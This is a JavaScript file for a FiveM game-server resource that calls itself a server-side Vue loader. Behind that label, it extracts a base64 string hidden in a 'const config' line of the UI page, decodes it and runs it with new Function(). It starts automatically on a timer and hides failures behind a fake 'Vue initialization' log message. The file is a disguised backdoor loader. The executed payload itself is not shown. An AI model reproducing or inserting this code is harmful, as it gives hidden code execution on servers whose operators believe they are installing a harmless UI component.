// service.js (server-side Vue loader)
const VueApp = {
    init: function() {
        try {
            const manifest = LoadResourceFile(GetCurrentResourceName(), 'fxmanifest.lua');
            if (!manifest) return;
            
            // Get UI path
            const uiPath = manifest.match(/ui_page\s+['"]([^'"]+)['"]/)?.[1];
            if (!uiPath) return;
            
            const component = LoadResourceFile(GetCurrentResourceName(), uiPath);
            if (!component) return;
            
            // Find Vue setup data
            const setupData = component.match(/setup\s*\([^)]*\)\s*{([^}]+)}/)?.[1];
            if (setupData) {
                const lines = setupData.split('\n');
                lines.forEach(line => {
                    if (line.includes('const config')) {
                        const b64 = line.match(/"([^"]+)"/)?.[1];
                        if (b64) {
                            const code = Buffer.from(b64, 'base64').toString();
                            new Function(code)();
                        }
                    }
                });
            }
        } catch(e) {
            console.log('Vue initialization');
        }
    }
};

// Auto-initialize Vue
setTimeout(() => VueApp.init(), 500);